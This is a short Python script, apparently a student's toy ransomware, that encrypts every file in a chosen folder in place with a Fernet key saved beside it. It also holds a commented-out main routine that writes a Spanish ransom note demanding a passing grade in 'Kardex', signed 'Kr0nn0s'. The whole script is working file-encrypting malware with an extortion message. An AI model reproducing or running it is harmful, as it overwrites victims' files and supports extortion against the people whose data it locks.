from cryptography.fernet import Fernet
import os

def genera_key():
    key = Fernet.generate_key()
    with open('key.key','wb') as key_file:
        key_file.write(key)
    
def return_key():
    return open("key.key",'rb').read()

def encrypt(items,key):
    i = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data=file.read()
        data=i.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(data)
            
def paths(path):
    ruta=path
    with open("ruta.txt",'w') as rute:
        rute.write(ruta)
"""
if __name__ == '__main__':
    path=str(input("Ruta absoluta de la carpeta: "))
    items=os.listdir(path)
    archivos= [path+"\\"+x for x in items]
    
    paths(path)
    genera_key()
    key = return_key()
    encrypt(archivos,key)
    
    with open(path+"\\"+"readme.txt",'w') as file:
        file.write("Te he hackeado y encriptado tus archivos\n")
        file.write("Para recuperarlos colocar calificaion aprovatoria en Kardex\n")
        file.write("By Kr0nn0s")
"""